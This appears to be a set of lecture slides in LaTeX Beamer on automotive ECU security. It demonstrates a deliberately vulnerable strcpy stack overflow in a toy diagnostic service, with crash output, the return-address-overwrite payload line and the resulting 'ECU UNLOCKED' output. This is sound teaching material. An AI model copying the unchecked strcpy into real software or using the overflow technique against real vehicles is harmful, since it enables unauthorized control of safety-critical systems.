@@ -1,0 +1,145 @@
+% Live vulnerability exploitation
+\xchapter{Live Demo}
+
+\begin{frame}[plain]
+  \vfill\centering
+  {\color{tumblue}\Huge\bfseries Live Demo\par}
+  \vspace{3mm}
+  {\large\color{tumgrey} Turning a memory bug into control of an ECU}
+  \vfill
+\end{frame}
+
+\begin{frame}{From One Bug to a Moving Car}
+  \centering
+  \begin{tikzpicture}[font=\footnotesize, node distance=5mm,
+     box/.style={draw,rounded corners,minimum height=1.05cm,minimum width=1.9cm,align=center},
+     arr/.style={-Stealth,very thick,tumblue}]
+    \node[cloud,draw,fill=gray!12,aspect=2,align=center,minimum width=1.9cm,minimum height=1.1cm] (net) {attacker\\(internet)};
+    \node[box,fill=alertred!18,draw=alertred,very thick,right=of net] (info) {Infotainment\\ECU};
+    \node[box,fill=tumblue!12,right=of info] (gw) {Gateway};
+    \node[box,fill=tumblue!12,right=of gw] (can) {CAN bus\\+ ECUs};
+    \node[box,fill=alertred!30,right=of can] (act) {Brakes /\\Steering};
+    \draw[arr] (net)--(info); \draw[arr] (info)--(gw); \draw[arr] (gw)--(can); \draw[arr] (can)--(act);
+    \node[alertred,align=center,font=\scriptsize] (lbl) at ($(info)+(0,-1.4)$) {today's live demo\\lives here};
+    \draw[-Stealth,alertred,thick] (lbl)--(info);
+  \end{tikzpicture}
+  \vspace{4mm}
+  \begin{itemize}
+    \item A remote bug gets you into \emph{one} internet-facing ECU. The real prize is \textbf{past the gateway}, onto the CAN bus, where the brakes and steering listen.
+    \item The Jeep did the whole chain. In a minute we'll do the first box: \textbf{turn a memory bug into control of an ECU.}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Live Demo: Setup}
+  \begin{itemize}
+    \item \textbf{Target}: a toy ECU diagnostic service. \texttt{handle\_diagnostic\_request()} copies an incoming payload into an 8-byte stack buffer; \texttt{unlock\_ecu()} is a privileged routine the program never calls.
+    \item \textbf{Bug class}: 7PK Input Validation together with API Abuse (a dangerous \texttt{strcpy}), CWE-120.
+    \item \textbf{Environment}: an isolated lab VM, compiled without modern protections (\texttt{-fno-stack-protector -no-pie}) so the classic textbook behaviour is visible. \alert{Never ship real code built this way.}
+    \item \textbf{Goal}: overflow the buffer so the handler "returns" into \texttt{unlock\_ecu()}, a routine that should sit behind seed-key authentication.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Step 1: The Vulnerable Code}
+  \begin{lstlisting}[language=C]
+void unlock_ecu(void) {              // never called by the program
+    write(1, "ECU UNLOCKED\n", 13);  // privileged routine
+}
+void handle_diagnostic_request(char *payload) {
+    char buf[8];
+    strcpy(buf, payload);            // no length check -- CWE-120
+}
+  \end{lstlisting}
+  \begin{itemize}
+    \item \texttt{buf} is 8 bytes. \texttt{payload} comes straight from the diagnostic request, fully attacker-controlled.
+    \item \texttt{strcpy} copies until it hits a \texttt{NUL} byte, however far past the end of \texttt{buf} that is. A SAST tool would flag this instantly.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Step 2: Crash It}
+\begin{lstlisting}[language=bash]
+$ ./vuln hello
+diagnostic request handled normally - no hijack.
+
+$ ./vuln $(python3 -c 'print("A"*50)')
+Segmentation fault
+\end{lstlisting}
+  \begin{itemize}
+    \item 50 bytes into an 8-byte buffer overwrites the saved base pointer and the saved return address with \texttt{0x4141...} (\texttt{'A'}s).
+    \item The CPU then tries to "return" to address \texttt{0x4141414141414141} and crashes. We now control that address.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Step 3: The Plan, in One Picture}
+  \centering
+  \begin{tikzpicture}[every node/.style={font=\footnotesize}]
+    % stack layout
+    \node[draw, minimum width=2.6cm, minimum height=1cm, fill=tumblue!15] (buf) at (0,0) {\texttt{buf[8]}};
+    \node[draw, minimum width=2.6cm, minimum height=1cm, fill=gray!20, right=0cm of buf] (rbp) {saved RBP};
+    \node[draw, minimum width=2.6cm, minimum height=1cm, fill=orange!30, right=0cm of rbp] (ret) {return addr};
+    % braces / labels
+    \node[font=\scriptsize] at (buf.south) [below=1mm] {8 bytes};
+    \node[font=\scriptsize] at (rbp.south) [below=1mm] {8 bytes};
+    \node[font=\scriptsize] at (ret.south) [below=1mm] {8 bytes};
+    % payload annotation
+    \node[alertred, align=center, font=\footnotesize] at (0,1.8) {16 bytes of \texttt{'A'}};
+    \draw[-Stealth, alertred, thick] (-1.1,1.5) -- (-1.1,0.55);
+    \draw[-Stealth, alertred, thick] (1.3,1.5) -- (1.3,0.55);
+    \node[tumblue, align=center, font=\footnotesize] at (5.2,1.8) {address of\\\texttt{unlock\_ecu()}};
+    \draw[-Stealth, tumblue, thick] (5.2,1.3) -- (5.2,0.55);
+  \end{tikzpicture}
+
+  \vspace{4mm}
+  \begin{itemize}
+    \item Fill the 8-byte buffer and the 8-byte saved RBP with 16 \texttt{'A'}s, then put the address of \texttt{unlock\_ecu()} where the return address was.
+    \item When \texttt{handle\_diagnostic\_request()} returns, it jumps into \texttt{unlock\_ecu()}.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Step 4: Build the Payload and Fire}
+\begin{lstlisting}[language=bash]
+$ ./vuln
+unlock_ecu() is at address: 0x401196   # the program tells us
+
+$ ./vuln $(python3 -c 'import sys;
+    sys.stdout.buffer.write(b"A"*16 + b"\x96\x11\x40")')
+\end{lstlisting}
+  \begin{itemize}
+    \item 16 filler bytes, then \texttt{unlock\_ecu()}'s address in little-endian (low byte first: \texttt{96 11 40}).
+    \item We only write the three non-zero bytes. \texttt{strcpy}'s own \texttt{NUL} terminator supplies the zero high bytes of the address, so the payload has no \texttt{NUL} and passes cleanly as an argument.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Step 5: Watch It Run}
+\begin{lstlisting}[language=bash]
+$ ./exploit.sh
+unlock_ecu() = 0x401196 , offset to return address = 16 bytes
+
+[ECU UNLOCKED] unlock_ecu() reached via the overflow...
+
+Segmentation fault
+\end{lstlisting}
+  \begin{itemize}
+    \item The \texttt{[ECU UNLOCKED]} banner is the proof: \texttt{unlock\_ecu()} ran because we overwrote the return address, not because any code called it.
+    \item The crash right after is expected: we jumped into \texttt{unlock\_ecu()} but never set up a clean way for it to return. The banner printed \emph{first} -- that's what matters.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Step 6: What Just Happened, in One Sentence}
+  \begin{alertblock}{}
+    An attacker who controls input copied into a fixed stack buffer controls where the program's execution goes next, including into code paths that were never meant to be reachable.
+  \end{alertblock}
+  \begin{itemize}
+    \item On a real ECU, \texttt{unlock\_ecu()} stands in for a privileged routine, a calibration function or a debug backdoor, that should sit behind an authentication check this bug walks straight past.
+    \item This is exactly why Input Validation sits at the top of the 7PK taxonomy, and why memory-safe languages like Rust and hardware mitigations (stack canaries, ASLR, NX/DEP, Pointer Authentication) exist. More on that next.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Going Further (Conceptually)}
+  \footnotesize
+  \setlength{\itemsep}{0pt}
+  \begin{itemize}
+    \item Today we jumped to a function already in the binary. A real attacker's next move is to jump into code \emph{they} supply, placed inside the same oversized input.
+    \item This is exactly what the next slide's mitigations stop: NX/DEP makes the stack non-executable, ASLR hides where the buffer sits, and a stack canary catches the overwrite before the hijacked return happens. We're deliberately stopping at the concept, not a working payload.
+    \item A worked example that goes all the way to a shell, via a GOT overwrite: \href{https://m-kamal.me/journal/got-challenge-journal/}{m-kamal.me/journal/got-challenge-journal}.
+  \end{itemize}
+\end{frame}
